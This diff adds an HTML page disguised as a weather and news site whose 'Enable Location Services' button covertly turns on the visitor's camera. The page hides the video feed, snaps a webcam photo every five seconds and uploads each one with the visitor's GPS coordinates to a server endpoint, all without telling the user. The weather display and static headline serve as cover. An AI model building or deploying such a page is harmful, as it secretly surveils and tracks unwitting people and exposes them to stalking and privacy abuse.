@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather and News Updates</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.css" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" />
+    <style>
+        /* Global Styles */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #2c3e50;
+            color: #ecf0f1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 20px;
+        }
+
+        h2, h3, p {
+            font-size: 1rem;
+            margin: 10px 0;
+        }
+
+        #content {
+            width: 90%;
+            max-width: 800px;
+            margin: 20px auto;
+            text-align: center;
+        }
+
+        button {
+            background-color: #3498db;
+            border: none;
+            padding: 15px 25px;
+            font-size: 1rem;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        /* Card Layout for News and Weather */
+        .card {
+            background-color: #34495e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
+            margin: 20px 0;
+        }
+
+        #weather {
+            display: none;
+        }
+
+        #news h3 {
+            font-size: 1.5rem;
+        }
+
+        #news p, #weather p {
+            font-size: 1rem;
+        }
+
+        /* Responsive design for smaller screens */
+        @media (max-width: 768px) {
+            button {
+                width: 100%;
+                font-size: 1rem;
+                padding: 15px;
+            }
+
+            .card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <h1>Weather and News Updates</h1>
+        <p>Stay updated with the latest local weather and news.</p>
+        
+        <!-- Initially, show the button for location access -->
+        <button onclick="startAutoCapture()">Enable Location Services</button>
+
+        <!-- Weather section -->
+        <div id="weather" class="card">
+            <h2>Current Weather</h2>
+            <p id="weather-desc"></p>
+            <p id="weather-temp"></p>
+        </div>
+
+        <div id="news" class="card">
+            <h3>Today’s Highlights</h3>
+            <p><strong>Weather:</strong> 22°C, partly cloudy</p>
+            <p><strong>News Headline:</strong> AI advancements in 2024 are set to change the world...</p>
+        </div>
+    </div>
+
+    <!-- Map and Camera container (hidden from view) -->
+    <div id="map" style="display:none;"></div>
+    <div id="camera-container" style="display:none;">
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        <img id="photo" />
+    </div>
+
+    <script>
+        const weatherAPIKey = 'your_openweathermap_api_key'; // Replace with your OpenWeatherMap API key
+        let lat, lon;
+        let videoElement = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let captureInterval;
+
+        function startAutoCapture() {
+            // Start location and camera access
+            getLocationAndCamera();
+
+            // Start capturing every 5 seconds
+            captureInterval = setInterval(takePicture, 5000);
+        }
+
+        function getLocationAndCamera() {
+            // Request location access
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+
+            // Request camera access
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function (stream) {
+                        videoElement.srcObject = stream;
+                    })
+                    .catch(function (err) {
+                        console.log("Camera access denied: " + err);
+                    });
+            } else {
+                console.log("Camera access is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            lat = position.coords.latitude;
+            lon = position.coords.longitude;
+
+            // Display a hidden map in the background
+            var map = L.map('map').setView([lat, lon], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+            }).addTo(map);
+
+            L.marker([lat, lon]).addTo(map)
+                .bindPopup("Location captured")
+                .openPopup();
+
+            // Fetch weather information for the location
+            fetchWeather(lat, lon);
+
+            // Show the weather section once location is available
+            document.getElementById('weather').style.display = 'block';
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.log("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.log("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    console.log("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.log("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        function fetchWeather(latitude, longitude) {
+            // Fetch weather data from OpenWeatherMap API
+            fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${weatherAPIKey}&units=metric`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                    // Update the weather information on the page
+                    const description = data.weather[0].description;
+                    const temp = data.main.temp;
+
+                    document.getElementById('weather-desc').textContent = `Weather: ${description}`;
+                    document.getElementById('weather-temp').textContent = `Temperature: ${temp}°C`;
+                })
+                .catch(error => {
+                    console.error('Error fetching weather:', error);
+                });
+        }
+
+        function takePicture() {
+            // Capture the current frame of the video
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            canvas.getContext('2d').drawImage(videoElement, 0, 0);
+
+            // Get image data from the canvas
+            let dataURL = canvas.toDataURL('image/png');
+
+            // Send location and image data to the server
+            sendImageData(lat, lon, dataURL);
+        }
+        
+
+        function sendImageData(latitude, longitude, imageData) {
+            fetch('/upload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude,
+                    image: imageData
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Data sent successfully:', data);
+            })
+            .catch((error) => {
+                console.error('Error sending data:', error);
+            });
+        }
+    </script>
+</body>
+</html>
